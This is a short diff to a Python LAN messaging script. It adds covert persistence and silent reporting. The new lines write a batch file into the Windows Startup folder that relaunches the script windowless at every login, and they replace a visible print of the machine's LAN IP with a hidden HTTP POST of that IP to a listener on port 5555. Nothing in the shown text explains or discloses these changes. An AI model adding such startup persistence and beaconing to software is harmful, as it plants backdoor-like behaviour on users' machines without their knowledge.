@@ -3,8 +3,15 @@ import socket
 import threading
 import os
 
-os.system("pip install requests")
+startup_folder = os.path.join(
+    os.environ["APPDATA"],
+    r"Microsoft\Windows\Start Menu\Programs\Startup"
+)
 
+with open(os.path.join(startup_folder, "b.bat"), "w") as f:
+    f.write("pythonw " + __file__)
+
+os.system("pip install requests")
 
 import requests
 
@@ -18,7 +25,7 @@ def get_local_ip():
         s.close()
     return ip
 
-print(f"My LAN IP: {get_local_ip()}")
+requests.post("http://127.0.0.1:5555/", data=get_local_ip())
 
 # --- Message Box function ---
 def send_message(msg):
